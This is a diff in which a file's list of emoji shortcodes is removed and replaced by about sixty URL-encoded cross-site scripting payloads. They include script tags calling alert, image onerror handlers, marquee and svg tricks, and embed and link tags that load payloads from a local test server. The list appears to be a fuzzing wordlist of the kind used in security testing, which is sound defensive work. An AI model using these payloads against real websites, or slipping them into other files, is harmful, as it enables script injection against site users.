@@ -1,845 +1,4550 @@
--:+1:  :+1:
--:-1:  :-1:
--:100:  :100:
--:1234:  :1234:
--:8ball:  :8ball:
--:a:  :a:
--:ab:  :ab:
--:abc:  :abc:
--:abcd:  :abcd:
--:accept:  :accept:
--:aerial_tramway:  :aerial_tramway:
--:airplane:  :airplane:
--:alarm_clock:  :alarm_clock:
--:alien:  :alien:
--:ambulance:  :ambulance:
--:anchor:  :anchor:
--:angel:  :angel:
--:anger:  :anger:
--:angry:  :angry:
--:ant:  :ant:
--:apple:  :apple:
--:aquarius:  :aquarius:
--:aries:  :aries:
--:arrow_backward:  :arrow_backward:
--:arrow_double_down:  :arrow_double_down:
--:arrow_double_up:  :arrow_double_up:
--:arrow_down:  :arrow_down:
--:arrow_down_small:  :arrow_down_small:
--:arrow_forward:  :arrow_forward:
--:arrow_heading_down:  :arrow_heading_down:
--:arrow_heading_up:  :arrow_heading_up:
--:arrow_left:  :arrow_left:
--:arrow_lower_left:  :arrow_lower_left:
--:arrow_lower_right:  :arrow_lower_right:
--:arrow_right:  :arrow_right:
--:arrow_right_hook:  :arrow_right_hook:
--:arrow_up:  :arrow_up:
--:arrow_up_down:  :arrow_up_down:
--:arrow_up_small:  :arrow_up_small:
--:arrow_upper_left:  :arrow_upper_left:
--:arrow_upper_right:  :arrow_upper_right:
--:arrows_clockwise:  :arrows_clockwise:
--:arrows_counterclockwise:  :arrows_counterclockwise:
--:art:  :art:
--:articulated_lorry:  :articulated_lorry:
--:astonished:  :astonished:
--:atm:  :atm:
--:b:  :b:
--:baby:  :baby:
--:baby_bottle:  :baby_bottle:
--:baby_chick:  :baby_chick:
--:baby_symbol:  :baby_symbol:
--:baggage_claim:  :baggage_claim:
--:balloon:  :balloon:
--:ballot_box_with_check:  :ballot_box_with_check:
--:bamboo:  :bamboo:
--:banana:  :banana:
--:bangbang:  :bangbang:
--:bank:  :bank:
--:bar_chart:  :bar_chart:
--:barber:  :barber:
--:baseball:  :baseball:
--:basketball:  :basketball:
--:bath:  :bath:
--:bathtub:  :bathtub:
--:battery:  :battery:
--:bear:  :bear:
--:beer:  :beer:
--:beers:  :beers:
--:beetle:  :beetle:
--:beginner:  :beginner:
--:bell:  :bell:
--:bento:  :bento:
--:bicyclist:  :bicyclist:
--:bike:  :bike:
--:bikini:  :bikini:
--:bird:  :bird:
--:birthday:  :birthday:
--:black_circle:  :black_circle:
--:black_joker:  :black_joker:
--:black_nib:  :black_nib:
--:black_square:  :black_square:
--:blossom:  :blossom:
--:blowfish:  :blowfish:
--:blue_book:  :blue_book:
--:blue_car:  :blue_car:
--:blue_heart:  :blue_heart:
--:blush:  :blush:
--:boar:  :boar:
--:boat:  :boat:
--:bomb:  :bomb:
--:book:  :book:
--:bookmark:  :bookmark:
--:bookmark_tabs:  :bookmark_tabs:
--:books:  :books:
--:boot:  :boot:
--:bouquet:  :bouquet:
--:bow:  :bow:
--:bowling:  :bowling:
--:bowtie:  :bowtie:
--:boy:  :boy:
--:bread:  :bread:
--:bride_with_veil:  :bride_with_veil:
--:bridge_at_night:  :bridge_at_night:
--:briefcase:  :briefcase:
--:broken_heart:  :broken_heart:
--:bug:  :bug:
--:bulb:  :bulb:
--:bullettrain_front:  :bullettrain_front:
--:bullettrain_side:  :bullettrain_side:
--:bus:  :bus:
--:busstop:  :busstop:
--:bust_in_silhouette:  :bust_in_silhouette:
--:busts_in_silhouette:  :busts_in_silhouette:
--:cactus:  :cactus:
--:cake:  :cake:
--:calendar:  :calendar:
--:calling:  :calling:
--:camel:  :camel:
--:camera:  :camera:
--:cancer:  :cancer:
--:candy:  :candy:
--:capital_abcd:  :capital_abcd:
--:capricorn:  :capricorn:
--:car:  :car:
--:card_index:  :card_index:
--:carousel_horse:  :carousel_horse:
--:cat2:  :cat2:
--:cat:  :cat:
--:cd:  :cd:
--:chart:  :chart:
--:chart_with_downwards_trend:  :chart_with_downwards_trend:
--:chart_with_upwards_trend:  :chart_with_upwards_trend:
--:checkered_flag:  :checkered_flag:
--:cherries:  :cherries:
--:cherry_blossom:  :cherry_blossom:
--:chestnut:  :chestnut:
--:chicken:  :chicken:
--:children_crossing:  :children_crossing:
--:chocolate_bar:  :chocolate_bar:
--:christmas_tree:  :christmas_tree:
--:church:  :church:
--:cinema:  :cinema:
--:circus_tent:  :circus_tent:
--:city_sunrise:  :city_sunrise:
--:city_sunset:  :city_sunset:
--:cl:  :cl:
--:clap:  :clap:
--:clapper:  :clapper:
--:clipboard:  :clipboard:
--:clock1030:  :clock1030:
--:clock10:  :clock10:
--:clock1130:  :clock1130:
--:clock11:  :clock11:
--:clock1230:  :clock1230:
--:clock12:  :clock12:
--:clock130:  :clock130:
--:clock1:  :clock1:
--:clock230:  :clock230:
--:clock2:  :clock2:
--:clock330:  :clock330:
--:clock3:  :clock3:
--:clock430:  :clock430:
--:clock4:  :clock4:
--:clock530:  :clock530:
--:clock5:  :clock5:
--:clock630:  :clock630:
--:clock6:  :clock6:
--:clock730:  :clock730:
--:clock7:  :clock7:
--:clock830:  :clock830:
--:clock8:  :clock8:
--:clock930:  :clock930:
--:clock9:  :clock9:
--:closed_book:  :closed_book:
--:closed_lock_with_key:  :closed_lock_with_key:
--:closed_umbrella:  :closed_umbrella:
--:cloud:  :cloud:
--:clubs:  :clubs:
--:cn:  :cn:
--:cocktail:  :cocktail:
--:coffee:  :coffee:
--:cold_sweat:  :cold_sweat:
--:collision:  :collision:
--:computer:  :computer:
--:confetti_ball:  :confetti_ball:
--:confounded:  :confounded:
--:congratulations:  :congratulations:
--:construction:  :construction:
--:construction_worker:  :construction_worker:
--:convenience_store:  :convenience_store:
--:cookie:  :cookie:
--:cool:  :cool:
--:cop:  :cop:
--:copyright:  :copyright:
--:corn:  :corn:
--:couple:  :couple:
--:couple_with_heart:  :couple_with_heart:
--:couplekiss:  :couplekiss:
--:cow2:  :cow2:
--:cow:  :cow:
--:credit_card:  :credit_card:
--:crocodile:  :crocodile:
--:crossed_flags:  :crossed_flags:
--:crown:  :crown:
--:cry:  :cry:
--:crying_cat_face:  :crying_cat_face:
--:crystal_ball:  :crystal_ball:
--:cupid:  :cupid:
--:curly_loop:  :curly_loop:
--:currency_exchange:  :currency_exchange:
--:curry:  :curry:
--:custard:  :custard:
--:customs:  :customs:
--:cyclone:  :cyclone:
--:dancer:  :dancer:
--:dancers:  :dancers:
--:dango:  :dango:
--:dart:  :dart:
--:dash:  :dash:
--:date:  :date:
--:de:  :de:
--:deciduous_tree:  :deciduous_tree:
--:department_store:  :department_store:
--:diamond_shape_with_a_dot_inside:  :diamond_shape_with_a_dot_inside:
--:diamonds:  :diamonds:
--:disappointed:  :disappointed:
--:dizzy:  :dizzy:
--:dizzy_face:  :dizzy_face:
--:do_not_litter:  :do_not_litter:
--:dog2:  :dog2:
--:dog:  :dog:
--:dollar:  :dollar:
--:dolls:  :dolls:
--:dolphin:  :dolphin:
--:door:  :door:
--:doughnut:  :doughnut:
--:dragon:  :dragon:
--:dragon_face:  :dragon_face:
--:dress:  :dress:
--:dromedary_camel:  :dromedary_camel:
--:droplet:  :droplet:
--:dvd:  :dvd:
--:e-mail:  :e-mail:
--:ear:  :ear:
--:ear_of_rice:  :ear_of_rice:
--:earth_africa:  :earth_africa:
--:earth_americas:  :earth_americas:
--:earth_asia:  :earth_asia:
--:egg:  :egg:
--:eggplant:  :eggplant:
--:eight:  :eight:
--:eight_pointed_black_star:  :eight_pointed_black_star:
--:eight_spoked_asterisk:  :eight_spoked_asterisk:
--:electric_plug:  :electric_plug:
--:elephant:  :elephant:
--:email:  :email:
--:end:  :end:
--:envelope:  :envelope:
--:es:  :es:
--:euro:  :euro:
--:european_castle:  :european_castle:
--:european_post_office:  :european_post_office:
--:evergreen_tree:  :evergreen_tree:
--:exclamation:  :exclamation:
--:eyeglasses:  :eyeglasses:
--:eyes:  :eyes:
--:facepunch:  :facepunch:
--:factory:  :factory:
--:fallen_leaf:  :fallen_leaf:
--:family:  :family:
--:fast_forward:  :fast_forward:
--:fax:  :fax:
--:fearful:  :fearful:
--:feelsgood:  :feelsgood:
--:feet:  :feet:
--:ferris_wheel:  :ferris_wheel:
--:file_folder:  :file_folder:
--:finnadie:  :finnadie:
--:fire:  :fire:
--:fire_engine:  :fire_engine:
--:fireworks:  :fireworks:
--:first_quarter_moon:  :first_quarter_moon:
--:first_quarter_moon_with_face:  :first_quarter_moon_with_face:
--:fish:  :fish:
--:fish_cake:  :fish_cake:
--:fishing_pole_and_fish:  :fishing_pole_and_fish:
--:fist:  :fist:
--:five:  :five:
--:flags:  :flags:
--:flashlight:  :flashlight:
--:floppy_disk:  :floppy_disk:
--:flower_playing_cards:  :flower_playing_cards:
--:flushed:  :flushed:
--:foggy:  :foggy:
--:football:  :football:
--:fork_and_knife:  :fork_and_knife:
--:fountain:  :fountain:
--:four:  :four:
--:four_leaf_clover:  :four_leaf_clover:
--:fr:  :fr:
--:free:  :free:
--:fried_shrimp:  :fried_shrimp:
--:fries:  :fries:
--:frog:  :frog:
--:fuelpump:  :fuelpump:
--:full_moon:  :full_moon:
--:full_moon_with_face:  :full_moon_with_face:
--:game_die:  :game_die:
--:gb:  :gb:
--:gem:  :gem:
--:gemini:  :gemini:
--:ghost:  :ghost:
--:gift:  :gift:
--:gift_heart:  :gift_heart:
--:girl:  :girl:
--:globe_with_meridians:  :globe_with_meridians:
--:goat:  :goat:
--:goberserk:  :goberserk:
--:godmode:  :godmode:
--:golf:  :golf:
--:grapes:  :grapes:
--:green_apple:  :green_apple:
--:green_book:  :green_book:
--:green_heart:  :green_heart:
--:grey_exclamation:  :grey_exclamation:
--:grey_question:  :grey_question:
--:grin:  :grin:
--:guardsman:  :guardsman:
--:guitar:  :guitar:
--:gun:  :gun:
--:haircut:  :haircut:
--:hamburger:  :hamburger:
--:hammer:  :hammer:
--:hamster:  :hamster:
--:hand:  :hand:
--:handbag:  :handbag:
--:hankey:  :hankey:
--:hash:  :hash:
--:hatched_chick:  :hatched_chick:
--:hatching_chick:  :hatching_chick:
--:headphones:  :headphones:
--:hear_no_evil:  :hear_no_evil:
--:heart:  :heart:
--:heart_decoration:  :heart_decoration:
--:heart_eyes:  :heart_eyes:
--:heart_eyes_cat:  :heart_eyes_cat:
--:heartbeat:  :heartbeat:
--:heartpulse:  :heartpulse:
--:hearts:  :hearts:
--:heavy_check_mark:  :heavy_check_mark:
--:heavy_division_sign:  :heavy_division_sign:
--:heavy_dollar_sign:  :heavy_dollar_sign:
--:heavy_exclamation_mark:  :heavy_exclamation_mark:
--:heavy_minus_sign:  :heavy_minus_sign:
--:heavy_multiplication_x:  :heavy_multiplication_x:
--:heavy_plus_sign:  :heavy_plus_sign:
--:helicopter:  :helicopter:
--:herb:  :herb:
--:hibiscus:  :hibiscus:
--:high_brightness:  :high_brightness:
--:high_heel:  :high_heel:
--:hocho:  :hocho:
--:honey_pot:  :honey_pot:
--:honeybee:  :honeybee:
--:horse:  :horse:
--:horse_racing:  :horse_racing:
--:hospital:  :hospital:
--:hotel:  :hotel:
--:hotsprings:  :hotsprings:
--:hourglass:  :hourglass:
--:house:  :house:
--:hurtrealbad:  :hurtrealbad:
--:ice_cream:  :ice_cream:
--:icecream:  :icecream:
--:id:  :id:
--:ideograph_advantage:  :ideograph_advantage:
--:imp:  :imp:
--:inbox_tray:  :inbox_tray:
--:incoming_envelope:  :incoming_envelope:
--:information_desk_person:  :information_desk_person:
--:information_source:  :information_source:
--:innocent:  :innocent:
--:interrobang:  :interrobang:
--:iphone:  :iphone:
--:it:  :it:
--:izakaya_lantern:  :izakaya_lantern:
--:jack_o_lantern:  :jack_o_lantern:
--:japan:  :japan:
--:japanese_castle:  :japanese_castle:
--:japanese_goblin:  :japanese_goblin:
--:japanese_ogre:  :japanese_ogre:
--:jeans:  :jeans:
--:joy:  :joy:
--:joy_cat:  :joy_cat:
--:jp:  :jp:
--:key:  :key:
--:keycap_ten:  :keycap_ten:
--:kimono:  :kimono:
--:kiss:  :kiss:
--:kissing_cat:  :kissing_cat:
--:kissing_face:  :kissing_face:
--:kissing_heart:  :kissing_heart:
--:koala:  :koala:
--:koko:  :koko:
--:kr:  :kr:
--:large_blue_circle:  :large_blue_circle:
--:large_blue_diamond:  :large_blue_diamond:
--:large_orange_diamond:  :large_orange_diamond:
--:last_quarter_moon:  :last_quarter_moon:
--:last_quarter_moon_with_face:  :last_quarter_moon_with_face:
--:laughing:  :laughing:
--:leaves:  :leaves:
--:ledger:  :ledger:
--:left_luggage:  :left_luggage:
--:left_right_arrow:  :left_right_arrow:
--:leftwards_arrow_with_hook:  :leftwards_arrow_with_hook:
--:lemon:  :lemon:
--:leo:  :leo:
--:leopard:  :leopard:
--:libra:  :libra:
--:light_rail:  :light_rail:
--:link:  :link:
--:lips:  :lips:
--:lipstick:  :lipstick:
--:lock:  :lock:
--:lock_with_ink_pen:  :lock_with_ink_pen:
--:lollipop:  :lollipop:
--:loop:  :loop:
--:loudspeaker:  :loudspeaker:
--:love_hotel:  :love_hotel:
--:love_letter:  :love_letter:
--:low_brightness:  :low_brightness:
--:m:  :m:
--:mag:  :mag:
--:mag_right:  :mag_right:
--:mahjong:  :mahjong:
--:mailbox:  :mailbox:
--:mailbox_closed:  :mailbox_closed:
--:mailbox_with_mail:  :mailbox_with_mail:
--:mailbox_with_no_mail:  :mailbox_with_no_mail:
--:man:  :man:
--:man_with_gua_pi_mao:  :man_with_gua_pi_mao:
--:man_with_turban:  :man_with_turban:
--:mans_shoe:  :mans_shoe:
--:maple_leaf:  :maple_leaf:
--:mask:  :mask:
--:massage:  :massage:
--:meat_on_bone:  :meat_on_bone:
--:mega:  :mega:
--:melon:  :melon:
--:memo:  :memo:
--:mens:  :mens:
--:metal:  :metal:
--:metro:  :metro:
--:microphone:  :microphone:
--:microscope:  :microscope:
--:milky_way:  :milky_way:
--:minibus:  :minibus:
--:minidisc:  :minidisc:
--:mobile_phone_off:  :mobile_phone_off:
--:money_with_wings:  :money_with_wings:
--:moneybag:  :moneybag:
--:monkey:  :monkey:
--:monkey_face:  :monkey_face:
--:monorail:  :monorail:
--:moon:  :moon:
--:mortar_board:  :mortar_board:
--:mount_fuji:  :mount_fuji:
--:mountain_bicyclist:  :mountain_bicyclist:
--:mountain_cableway:  :mountain_cableway:
--:mountain_railway:  :mountain_railway:
--:mouse2:  :mouse2:
--:mouse:  :mouse:
--:movie_camera:  :movie_camera:
--:moyai:  :moyai:
--:muscle:  :muscle:
--:mushroom:  :mushroom:
--:musical_keyboard:  :musical_keyboard:
--:musical_note:  :musical_note:
--:musical_score:  :musical_score:
--:mute:  :mute:
--:nail_care:  :nail_care:
--:name_badge:  :name_badge:
--:neckbeard:  :neckbeard:
--:necktie:  :necktie:
--:negative_squared_cross_mark:  :negative_squared_cross_mark:
--:neutral_face:  :neutral_face:
--:new:  :new:
--:new_moon:  :new_moon:
--:new_moon_with_face:  :new_moon_with_face:
--:newspaper:  :newspaper:
--:ng:  :ng:
--:nine:  :nine:
--:no_bell:  :no_bell:
--:no_bicycles:  :no_bicycles:
--:no_entry:  :no_entry:
--:no_entry_sign:  :no_entry_sign:
--:no_good:  :no_good:
--:no_mobile_phones:  :no_mobile_phones:
--:no_mouth:  :no_mouth:
--:no_pedestrians:  :no_pedestrians:
--:no_smoking:  :no_smoking:
--:non-potable_water:  :non-potable_water:
--:nose:  :nose:
--:notebook:  :notebook:
--:notebook_with_decorative_cover:  :notebook_with_decorative_cover:
--:notes:  :notes:
--:nut_and_bolt:  :nut_and_bolt:
--:o2:  :o2:
--:o:  :o:
--:ocean:  :ocean:
--:octocat:  :octocat:
--:octopus:  :octopus:
--:oden:  :oden:
--:office:  :office:
--:ok:  :ok:
--:ok_hand:  :ok_hand:
--:ok_woman:  :ok_woman:
--:older_man:  :older_man:
--:older_woman:  :older_woman:
--:on:  :on:
--:oncoming_automobile:  :oncoming_automobile:
--:oncoming_bus:  :oncoming_bus:
--:oncoming_police_car:  :oncoming_police_car:
--:oncoming_taxi:  :oncoming_taxi:
--:one:  :one:
--:open_file_folder:  :open_file_folder:
--:open_hands:  :open_hands:
--:ophiuchus:  :ophiuchus:
--:orange_book:  :orange_book:
--:outbox_tray:  :outbox_tray:
--:ox:  :ox:
--:page_facing_up:  :page_facing_up:
--:page_with_curl:  :page_with_curl:
--:pager:  :pager:
--:palm_tree:  :palm_tree:
--:panda_face:  :panda_face:
--:paperclip:  :paperclip:
--:parking:  :parking:
--:part_alternation_mark:  :part_alternation_mark:
--:partly_sunny:  :partly_sunny:
--:passport_control:  :passport_control:
--:paw_prints:  :paw_prints:
--:peach:  :peach:
--:pear:  :pear:
--:pencil2:  :pencil2:
--:pencil:  :pencil:
--:penguin:  :penguin:
--:pensive:  :pensive:
--:performing_arts:  :performing_arts:
--:persevere:  :persevere:
--:person_frowning:  :person_frowning:
--:person_with_blond_hair:  :person_with_blond_hair:
--:person_with_pouting_face:  :person_with_pouting_face:
--:phone:  :phone:
--:pig2:  :pig2:
--:pig:  :pig:
--:pig_nose:  :pig_nose:
--:pill:  :pill:
--:pineapple:  :pineapple:
--:pisces:  :pisces:
--:pizza:  :pizza:
--:point_down:  :point_down:
--:point_left:  :point_left:
--:point_right:  :point_right:
--:point_up:  :point_up:
--:point_up_2:  :point_up_2:
--:police_car:  :police_car:
--:poodle:  :poodle:
--:poop:  :poop:
--:post_office:  :post_office:
--:postal_horn:  :postal_horn:
--:postbox:  :postbox:
--:potable_water:  :potable_water:
--:pouch:  :pouch:
--:poultry_leg:  :poultry_leg:
--:pound:  :pound:
--:pouting_cat:  :pouting_cat:
--:pray:  :pray:
--:princess:  :princess:
--:punch:  :punch:
--:purple_heart:  :purple_heart:
--:purse:  :purse:
--:pushpin:  :pushpin:
--:put_litter_in_its_place:  :put_litter_in_its_place:
--:question:  :question:
--:rabbit2:  :rabbit2:
--:rabbit:  :rabbit:
--:racehorse:  :racehorse:
--:radio:  :radio:
--:radio_button:  :radio_button:
--:rage1:  :rage1:
--:rage2:  :rage2:
--:rage3:  :rage3:
--:rage4:  :rage4:
--:rage:  :rage:
--:railway_car:  :railway_car:
--:rainbow:  :rainbow:
--:raised_hand:  :raised_hand:
--:raised_hands:  :raised_hands:
--:ram:  :ram:
--:ramen:  :ramen:
--:rat:  :rat:
--:recycle:  :recycle:
--:red_car:  :red_car:
--:red_circle:  :red_circle:
--:registered:  :registered:
--:relaxed:  :relaxed:
--:relieved:  :relieved:
--:repeat:  :repeat:
--:repeat_one:  :repeat_one:
--:restroom:  :restroom:
--:revolving_hearts:  :revolving_hearts:
--:rewind:  :rewind:
--:ribbon:  :ribbon:
--:rice:  :rice:
--:rice_ball:  :rice_ball:
--:rice_cracker:  :rice_cracker:
--:rice_scene:  :rice_scene:
--:ring:  :ring:
--:rocket:  :rocket:
--:roller_coaster:  :roller_coaster:
--:rooster:  :rooster:
--:rose:  :rose:
--:rotating_light:  :rotating_light:
--:round_pushpin:  :round_pushpin:
--:rowboat:  :rowboat:
--:ru:  :ru:
--:rugby_football:  :rugby_football:
--:runner:  :runner:
--:running:  :running:
--:running_shirt_with_sash:  :running_shirt_with_sash:
--:sa:  :sa:
--:sagittarius:  :sagittarius:
--:sailboat:  :sailboat:
--:sake:  :sake:
--:sandal:  :sandal:
--:santa:  :santa:
--:satellite:  :satellite:
--:satisfied:  :satisfied:
--:saxophone:  :saxophone:
--:school:  :school:
--:school_satchel:  :school_satchel:
--:scissors:  :scissors:
--:scorpius:  :scorpius:
--:scream:  :scream:
--:scream_cat:  :scream_cat:
--:scroll:  :scroll:
--:seat:  :seat:
--:secret:  :secret:
--:see_no_evil:  :see_no_evil:
--:seedling:  :seedling:
--:seven:  :seven:
--:shaved_ice:  :shaved_ice:
--:sheep:  :sheep:
--:shell:  :shell:
--:ship:  :ship:
--:shipit:  :shipit:
--:shirt:  :shirt:
--:shit:  :shit:
--:shoe:  :shoe:
--:shower:  :shower:
--:signal_strength:  :signal_strength:
--:six:  :six:
--:six_pointed_star:  :six_pointed_star:
--:ski:  :ski:
--:skull:  :skull:
--:sleepy:  :sleepy:
--:slot_machine:  :slot_machine:
--:small_blue_diamond:  :small_blue_diamond:
--:small_orange_diamond:  :small_orange_diamond:
--:small_red_triangle:  :small_red_triangle:
--:small_red_triangle_down:  :small_red_triangle_down:
--:smile:  :smile:
--:smile_cat:  :smile_cat:
--:smiley:  :smiley:
--:smiley_cat:  :smiley_cat:
--:smiling_imp:  :smiling_imp:
--:smirk:  :smirk:
--:smirk_cat:  :smirk_cat:
--:smoking:  :smoking:
--:snail:  :snail:
--:snake:  :snake:
--:snowboarder:  :snowboarder:
--:snowflake:  :snowflake:
--:snowman:  :snowman:
--:sob:  :sob:
--:soccer:  :soccer:
--:soon:  :soon:
--:sos:  :sos:
--:sound:  :sound:
--:space_invader:  :space_invader:
--:spades:  :spades:
--:spaghetti:  :spaghetti:
--:sparkler:  :sparkler:
--:sparkles:  :sparkles:
--:speak_no_evil:  :speak_no_evil:
--:speaker:  :speaker:
--:speech_balloon:  :speech_balloon:
--:speedboat:  :speedboat:
--:squirrel:  :squirrel:
--:star2:  :star2:
--:star:  :star:
--:stars:  :stars:
--:station:  :station:
--:statue_of_liberty:  :statue_of_liberty:
--:steam_locomotive:  :steam_locomotive:
--:stew:  :stew:
--:straight_ruler:  :straight_ruler:
--:strawberry:  :strawberry:
--:sun_with_face:  :sun_with_face:
--:sunflower:  :sunflower:
--:sunglasses:  :sunglasses:
--:sunny:  :sunny:
--:sunrise:  :sunrise:
--:sunrise_over_mountains:  :sunrise_over_mountains:
--:surfer:  :surfer:
--:sushi:  :sushi:
--:suspect:  :suspect:
--:suspension_railway:  :suspension_railway:
--:sweat:  :sweat:
--:sweat_drops:  :sweat_drops:
--:sweat_smile:  :sweat_smile:
--:sweet_potato:  :sweet_potato:
--:swimmer:  :swimmer:
--:symbols:  :symbols:
--:syringe:  :syringe:
--:tada:  :tada:
--:tanabata_tree:  :tanabata_tree:
--:tangerine:  :tangerine:
--:taurus:  :taurus:
--:taxi:  :taxi:
--:tea:  :tea:
--:telephone:  :telephone:
--:telephone_receiver:  :telephone_receiver:
--:telescope:  :telescope:
--:tennis:  :tennis:
--:tent:  :tent:
--:thought_balloon:  :thought_balloon:
--:three:  :three:
--:thumbsdown:  :thumbsdown:
--:thumbsup:  :thumbsup:
--:ticket:  :ticket:
--:tiger2:  :tiger2:
--:tiger:  :tiger:
--:tired_face:  :tired_face:
--:tm:  :tm:
--:toilet:  :toilet:
--:tokyo_tower:  :tokyo_tower:
--:tomato:  :tomato:
--:tongue2:  :tongue2:
--:tongue:  :tongue:
--:top:  :top:
--:tophat:  :tophat:
--:tractor:  :tractor:
--:traffic_light:  :traffic_light:
--:train2:  :train2:
--:train:  :train:
--:tram:  :tram:
--:triangular_flag_on_post:  :triangular_flag_on_post:
--:triangular_ruler:  :triangular_ruler:
--:trident:  :trident:
--:triumph:  :triumph:
--:trolleybus:  :trolleybus:
--:trollface:  :trollface:
--:trophy:  :trophy:
--:tropical_drink:  :tropical_drink:
--:tropical_fish:  :tropical_fish:
--:truck:  :truck:
--:trumpet:  :trumpet:
--:tshirt:  :tshirt:
--:tulip:  :tulip:
--:turtle:  :turtle:
--:tv:  :tv:
--:twisted_rightwards_arrows:  :twisted_rightwards_arrows:
--:two:  :two:
--:two_hearts:  :two_hearts:
--:two_men_holding_hands:  :two_men_holding_hands:
--:two_women_holding_hands:  :two_women_holding_hands:
--:u5272:  :u5272:
--:u5408:  :u5408:
--:u55b6:  :u55b6:
--:u6307:  :u6307:
--:u6708:  :u6708:
--:u6709:  :u6709:
--:u6e80:  :u6e80:
--:u7121:  :u7121:
--:u7533:  :u7533:
--:u7981:  :u7981:
--:u7a7a:  :u7a7a:
--:uk:  :uk:
--:umbrella:  :umbrella:
--:unamused:  :unamused:
--:underage:  :underage:
--:unlock:  :unlock:
--:up:  :up:
--:us:  :us:
--:v:  :v:
--:vertical_traffic_light:  :vertical_traffic_light:
--:vhs:  :vhs:
--:vibration_mode:  :vibration_mode:
--:video_camera:  :video_camera:
--:video_game:  :video_game:
--:violin:  :violin:
--:virgo:  :virgo:
--:volcano:  :volcano:
--:vs:  :vs:
--:walking:  :walking:
--:waning_crescent_moon:  :waning_crescent_moon:
--:waning_gibbous_moon:  :waning_gibbous_moon:
--:warning:  :warning:
--:watch:  :watch:
--:water_buffalo:  :water_buffalo:
--:watermelon:  :watermelon:
--:wave:  :wave:
--:wavy_dash:  :wavy_dash:
--:waxing_crescent_moon:  :waxing_crescent_moon:
--:waxing_gibbous_moon:  :waxing_gibbous_moon:
--:wc:  :wc:
--:weary:  :weary:
--:wedding:  :wedding:
--:whale2:  :whale2:
--:whale:  :whale:
--:wheelchair:  :wheelchair:
--:white_circle:  :white_circle:
--:white_flower:  :white_flower:
--:white_square:  :white_square:
--:wind_chime:  :wind_chime:
--:wine_glass:  :wine_glass:
--:wink2:  :wink2:
--:wink:  :wink:
--:wolf:  :wolf:
--:woman:  :woman:
--:womans_clothes:  :womans_clothes:
--:womans_hat:  :womans_hat:
--:womens:  :womens:
--:wrench:  :wrench:
--:x:  :x:
--:yellow_heart:  :yellow_heart:
--:yen:  :yen:
--:yum:  :yum:
--:zap:  :zap:
--:zero:  :zero:
--:zzz:  :zzz:
+''%22%3E  
+%E2%80%9D%3E%3Cscript%3Ealert(%E2%80%9CX%E2%80%9D)%3C/script%3E  
+%E2%80%99%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%20'%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%22%20onerror=alert(1)%20%22  
+%22%20onerror=alert(1)%20x=%22  
+-alert(1)-  
+-prompt(1)-  
+%3Cmarquee/onstart=confirm(1)%3E  
+%22%3E%3Cmarquee/onstart=confirm(1)%3E  
+'%3E%3Cmarquee/onstart=confirm(1)%3E  
+%3Cimg%20src=x%20onerror=prompt(1);%3E  
+%22%3E%3Cimg%20src=x%20onerror=prompt(1);%3E  
+'%3E%3Cimg%20src=x%20onerror=prompt(1);%3E  
+%3Cimg%20src=x%20onerror=prompt(1)%3E  
+%22%3E%3Cimg%20src=x%20onerror=prompt(1)%3E  
+'%3E%3Cimg%20src=x%20onerror=prompt(1)%3E  
+'';!--%22%3CX%3E=&%7B()%7D  
+%3CSCRIPT%3E+alert(%22X%22);%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%3E+alert(%22X%22);%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%3E+alert(%22X%22);%3C/SCRIPT%3E  
+%3CSCRIPT%3E+alert(%22X%22)%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%3E+alert(%22X%22)%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%3E+alert(%22X%22)%3C/SCRIPT%3E  
+%3Cscript%3Ealert(/X/)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(/X/)%3C/script%3E  
+'%3E%3Cscript%3Ealert(/X/)%3C/script%3E  
+%3Csvg%3E%3Cscript%3Evarmyvar=%22text&quot;;alert(1)//%22;%3C/script%3E%3C/svg%3E  
+%22%3E%3Csvg%3E%3Cscript%3Evarmyvar=%22text&quot;;alert(1)//%22;%3C/script%3E%3C/svg%3E  
+'%3E%3Csvg%3E%3Cscript%3Evarmyvar=%22text&quot;;alert(1)//%22;%3C/script%3E%3C/svg%3E  
+%3Cobject%20type=%22text/x-scriptlet%22%20data=%22http://jsfiddle.net/XLE63/%20%22%3E%3C/object%3E  
+%22%3E%3Cobject%20type=%22text/x-scriptlet%22%20data=%22http://jsfiddle.net/XLE63/%20%22%3E%3C/object%3E  
+'%3E%3Cobject%20type=%22text/x-scriptlet%22%20data=%22http://jsfiddle.net/XLE63/%20%22%3E%3C/object%3E  
+%3Cmath%3E%3Ca%20xlink:href=%22//127.0.0.1:3555/xss_serve_payloads/X.js%22%3Eclick  
+%22%3E%3Cmath%3E%3Ca%20xlink:href=%22//127.0.0.1:3555/xss_serve_payloads/X.js%22%3Eclick  
+'%3E%3Cmath%3E%3Ca%20xlink:href=%22//127.0.0.1:3555/xss_serve_payloads/X.js%22%3Eclick  
+%3Cembed%20code=%22http://127.0.0.1:3555/xss_serve_payloads/flash.swf%22%20allowscriptaccess=always%3E  
+%22%3E%3Cembed%20code=%22http://127.0.0.1:3555/xss_serve_payloads/flash.swf%22%20allowscriptaccess=always%3E  
+'%3E%3Cembed%20code=%22http://127.0.0.1:3555/xss_serve_payloads/flash.swf%22%20allowscriptaccess=always%3E  
+%3Cscript%20itworksinallbrowsers%3E/*%3Cscript*%20*/alert(1)%3C/script  
+%22%3E%3Cscript%20itworksinallbrowsers%3E/*%3Cscript*%20*/alert(1)%3C/script  
+'%3E%3Cscript%20itworksinallbrowsers%3E/*%3Cscript*%20*/alert(1)%3C/script  
+%3Cimg%20src%20?itworksonchrome?\x5C/onerror%20=%20alert(1)  
+%22%3E%3Cimg%20src%20?itworksonchrome?\x5C/onerror%20=%20alert(1)  
+'%3E%3Cimg%20src%20?itworksonchrome?\x5C/onerror%20=%20alert(1)  
+%3Cscript%20crossorigin%3Ealert(1);%3C/script%3E  
+%22%3E%3Cscript%20crossorigin%3Ealert(1);%3C/script%3E  
+'%3E%3Cscript%20crossorigin%3Ealert(1);%3C/script%3E  
+%3Cscript%20async%3Ealert(1);%3C/script%20async%3E  
